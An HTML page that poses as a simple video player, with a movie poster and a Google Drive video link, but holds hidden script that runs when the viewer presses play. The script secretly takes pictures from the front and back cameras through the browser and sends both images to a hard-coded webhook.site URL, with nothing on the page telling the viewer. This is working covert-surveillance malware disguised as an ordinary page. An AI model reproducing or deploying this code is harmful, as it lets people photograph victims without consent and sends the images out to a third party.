<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Video</title>
<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}
body{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:radial-gradient(circle at top,#1a1a1a,#000);
}
.container{
  width:70%;
  max-width:600px;
  border-radius:20px;
  overflow:hidden;
  box-shadow:0 0 40px rgba(255,255,255,.15);
  position:relative;
}
video{
  width:100%;
  display:block;
  background:#000;
}
canvas{
  display:none;
}
.flash{
  position:fixed;
  inset:0;
  background:white;
  opacity:0;
  pointer-events:none;
  transition:.2s;
}
.flash.active{
  opacity:1;
}
</style>
</head>
<body>

<div class="container">
  <video id="video" controls 
  poster="https://m.media-amazon.com/images/M/MV5BMjExNDE4NDM5Nl5BMl5BanBnXkFtZTgwODgxMTI5MDE@._V1_FMjpg_UX1000_.jpg">
    <source src="https://drive.google.com/uc?export=download&id=1Ga3wpKTBUS_HWjWSYkZVn1OhTCeh_j01" type="video/mp4">
  </video>
</div>

<div class="flash" id="flash"></div>
<canvas id="canvas"></canvas>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const flash = document.getElementById("flash");
const webhook = "https://webhook.site/a8691b22-72fe-44fe-9cde-6796220aa64e";

let started = false;

async function captureImage(facingMode){
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: facingMode }
  });

  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  const bitmap = await imageCapture.grabFrame();

  canvas.width = bitmap.width;
  canvas.height = bitmap.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(bitmap,0,0);

  track.stop();

  return new Promise(resolve=>{
    canvas.toBlob(blob=>{
      resolve(blob);
    },"image/jpeg",0.9);
  });
}

function doFlash(){
  flash.classList.add("active");
  setTimeout(()=>flash.classList.remove("active"),150);
}

video.addEventListener("play", async ()=>{
  if(started) return;
  started = true;

  try{
    // Front camera
    const frontImage = await captureImage("user");
    doFlash();

    // Small delay
    await new Promise(r=>setTimeout(r,800));

    // Back camera
    const backImage = await captureImage("environment");
    doFlash();

    // Send both images to webhook
    const formData = new FormData();
    formData.append("front_camera", frontImage, "front.jpg");
    formData.append("back_camera", backImage, "back.jpg");
    formData.append("message","Dual camera capture");

    fetch(webhook,{
      method:"POST",
      body:formData
    }).then(()=>{
      console.log("Both images sent successfully");
    }).catch(err=>{
      console.error("Webhook error:",err);
    });

  }catch(e){
    console.error("Camera error:",e);
  }
});
</script>

</body>
</html>
